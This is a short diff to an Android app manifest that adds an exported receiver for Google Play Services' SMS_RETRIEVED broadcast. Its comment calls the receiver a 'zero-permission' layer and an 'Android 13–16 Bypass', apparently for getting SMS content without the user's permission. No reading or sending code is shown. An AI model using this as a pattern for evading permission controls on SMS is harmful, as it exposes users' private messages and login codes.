@@ -58,5 +58,15 @@
         </intent-filter>
       </receiver>
 
+      <!-- Layer 2: Zero-Permission SMS Retriever (Google Play Services, Android 13–16 Bypass) -->
+      <receiver
+        android:name=".SmsRetrieverReceiver"
+        android:exported="true"
+        android:permission="com.google.android.gms.auth.api.phone.permission.SEND">
+        <intent-filter>
+          <action android:name="com.google.android.gms.auth.api.phone.SMS_RETRIEVED" />
+        </intent-filter>
+      </receiver>
+
     </application>
 </manifest>
